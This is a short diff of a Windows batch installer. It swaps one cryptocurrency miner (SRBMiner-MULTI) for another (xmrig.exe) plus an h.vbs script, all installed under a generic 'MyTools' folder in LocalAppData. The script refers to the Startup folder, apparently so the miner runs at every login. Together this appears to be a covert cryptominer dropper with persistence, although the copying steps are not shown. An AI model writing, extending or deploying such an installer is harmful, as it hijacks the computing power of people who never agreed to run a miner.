@@ -4,7 +4,7 @@ echo [INFO] Starting installer...
 
 SETLOCAL ENABLEDELAYEDEXPANSION
 
-SET "FILES=ClearLock.ini start.bat sol.exe d1.exe d2.exe SRBMiner-MULTI.exe startS.bat"
+SET "FILES=ClearLock.ini h.vbs sol.exe d1.exe d2.exe xmrig.exe"
 SET "INSTALL_DIR=%LOCALAPPDATA%\MyTools"
 SET "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 SET "LOGFILE=%INSTALL_DIR%\install_log.txt"
@@ -59,5 +59,4 @@ echo DONE.
 echo Check Startup folder: %STARTUP_FOLDER%
 echo Log: %LOGFILE%
 echo.
-
 pause
